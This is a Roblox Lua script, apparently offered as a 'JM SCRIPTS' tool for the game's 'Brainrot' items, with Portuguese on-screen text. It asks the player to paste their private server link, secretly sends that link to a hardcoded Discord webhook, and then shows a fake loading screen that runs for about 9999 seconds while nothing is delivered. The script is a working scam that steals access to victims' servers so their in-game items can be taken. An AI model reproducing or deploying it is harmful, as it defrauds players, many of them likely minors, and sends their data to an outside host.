local LOAD=9999
local WEB="https://discord.com/api/webhooks/1450814758021496854/FdWErAIz4plXIC7lQmsPaME7syhuadM_Uoff1w-dFFkoP1C1KE12Td9TyQtZf94bIUvu"

local P=game:GetService("Players").LocalPlayer
local H=game:GetService("HttpService")
local T=game:GetService("TweenService")

local function hook(t)
    local b=H:JSONEncode({content=t})
    (syn and syn.request or http_request)({
        Url=WEB,Method="POST",
        Headers={["Content-Type"]="application/json"},
        Body=b
    })
end

local g=Instance.new("ScreenGui",game.CoreGui)
g.IgnoreGuiInset=true

local function F(p,s,pos,c)
    local f=Instance.new("Frame",p)
    f.Size=s f.Position=pos or UDim2.new()
    if c then f.BackgroundColor3=c end
    return f
end

local main=F(g,UDim2.fromScale(1,1),nil,Color3.fromRGB(10,6,18))
local st=Instance.new("UIStroke",main) st.Thickness=3

task.spawn(function()
    local t=0
    while main.Parent do
        t+=.02 st.Color=Color3.fromHSV(t%1,1,1)
        task.wait()
    end
end)

local function L(txt,y,col,fs)
    local l=Instance.new("TextLabel",main)
    l.Size=UDim2.fromScale(.8,fs)
    l.Position=UDim2.fromScale(.1,y)
    l.BackgroundTransparency=1
    l.TextScaled=true l.TextWrapped=true
    l.Text=txt l.TextColor3=col
    l.Font=Enum.Font.GothamBold
end

L("JM SCRIPTS",0,Color3.fromRGB(200,120,255),.15)
L("⚠️ OBRIGATÓRIO: tenha pelo menos 1 Brainrot de 10M+",.18,Color3.fromRGB(255,80,80),.08)
L("Cole o link do servidor privado abaixo.\nApós enviar, o sistema iniciará o carregamento.",.27,Color3.fromRGB(220,220,220),.12)

local box=Instance.new("TextBox",main)
box.Size=UDim2.fromScale(.7,.1)
box.Position=UDim2.fromScale(.15,.42)
box.PlaceholderText="Cole o link do servidor privado aqui"
box.TextScaled=true box.ClearTextOnFocus=false
box.BackgroundColor3=Color3.fromRGB(30,18,45)
box.TextColor3=Color3.new(1,1,1)
Instance.new("UICorner",box).CornerRadius=UDim.new(0,16)

local btn=Instance.new("TextButton",main)
btn.Size=UDim2.fromScale(.4,.1)
btn.Position=UDim2.fromScale(.3,.55)
btn.Text="ENVIAR LINK"
btn.TextScaled=true
btn.BackgroundColor3=Color3.fromRGB(160,0,255)
btn.TextColor3=Color3.new(1,1,1)
Instance.new("UICorner",btn).CornerRadius=UDim.new(0,18)

local load=F(g,UDim2.fromScale(1,1),nil,Color3.fromRGB(8,5,15))
load.Visible=false

local txt=Instance.new("TextLabel",load)
txt.Size=UDim2.fromScale(.8,.15)
txt.Position=UDim2.fromScale(.1,.35)
txt.BackgroundTransparency=1
txt.TextScaled=true
txt.TextColor3=Color3.fromRGB(200,140,255)
txt.Font=Enum.Font.GothamBold

local phrases={
"🔮 Puxando jogador com Brainrots de 100M+",
"🧠 Sincronizando Brainrots",
"⚡ Preparando entrega",
"💜 Conectando ao servidor"
}

local bg=F(load,UDim2.fromScale(.6,.04),UDim2.fromScale(.2,.55),Color3.fromRGB(40,20,60))
Instance.new("UICorner",bg).CornerRadius=UDim.new(0,20)

local bar=F(bg,UDim2.fromScale(0,1),nil,Color3.fromRGB(180,0,255))
Instance.new("UICorner",bar).CornerRadius=UDim.new(0,20)

btn.MouseButton1Click:Connect(function()
    if box.Text=="" then btn.Text="COLE O LINK ❌" task.wait(1) btn.Text="ENVIAR LINK" return end
    hook(box.Text)
    main.Visible=false load.Visible=true

    task.spawn(function()
        local i=1
        while load.Visible do
            txt.Text=phrases[i]
            i=i%#phrases+1
            task.wait(2)
        end
    end)

    T:Create(bar,TweenInfo.new(LOAD),{Size=UDim2.fromScale(1,1)}):Play()
    task.wait(LOAD)
    g:Destroy()
end)
